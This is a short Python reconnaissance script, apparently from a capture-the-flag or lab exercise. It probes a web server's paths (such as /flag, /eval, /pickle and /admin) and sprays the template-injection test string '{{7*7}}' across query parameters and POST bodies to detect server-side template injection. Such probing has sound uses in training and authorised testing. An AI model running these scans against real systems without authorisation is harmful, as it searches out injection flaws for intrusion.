import sys, json, base64, itertools

def send(obj):
    sys.stdout.write(json.dumps(obj) + "\n")
    sys.stdout.flush()
    line = sys.stdin.readline()
    if not line:
        return None
    line = line.strip()
    if not line:
        return None
    try:
        return json.loads(line)
    except Exception:
        return {"raw": line}

def http(method, path, body=None, headers=None, body_hex=None):
    h = {"method": method, "path": path}
    if body is not None:
        h["body"] = body
    if body_hex is not None:
        h["body_hex"] = body_hex
    if headers:
        h["headers"] = headers
    r = send({"http": h})
    if not r or "status" not in r:
        return (0, b"", "NOREP")
    try:
        b = base64.b64decode(r.get("body_b64") or "")
    except Exception:
        b = b""
    return (r.get("status", 0), b, r.get("content_type", ""))

def p(tag, res, maxlen=900):
    st, b, ct = res
    s = b[:maxlen].decode("utf-8", "replace")
    print("### %s status=%s ct=%s len=%d" % (tag, st, ct, len(b)))
    print(s.replace("\r", ""))
    print("---")

paths = ["/", "/flag", "/health", "/robots.txt", "/admin", "/api", "/search",
         "/render", "/template", "/eval", "/pickle", "/load", "/deserialize",
         "/greet", "/hello", "/index"]
for path in paths:
    p("GET " + path, http("GET", path))

probe = "{{7*7}}"
params = ["name", "q", "msg", "message", "template", "input", "search", "id",
          "file", "page", "content", "data", "cmd", "expr", "expression",
          "username", "user", "text", "title", "value", "x"]
for prm in params:
    for path in ["/", "/search", "/render", "/template", "/greet", "/hello"]:
        pth = path + "?" + prm + "=" + probe.replace("{", "%7B").replace("}", "%7D").replace("*", "%2A").replace("7", "7")
        st, b, ct = http("GET", pth)
        if b"49" in b and st == 200:
            p("HIT " + pth, (st, b, ct))

for ct_hdr, body in [("application/x-www-form-urlencoded", "q=" + probe),
                     ("application/x-www-form-urlencoded", "name=" + probe),
                     ("application/json", json.dumps({"q": probe})),
                     ("text/plain", probe)]:
    p("POST / " + ct_hdr, http("POST", "/", body=body, headers={"Content-Type": ct_hdr}))

print("RECON_DONE")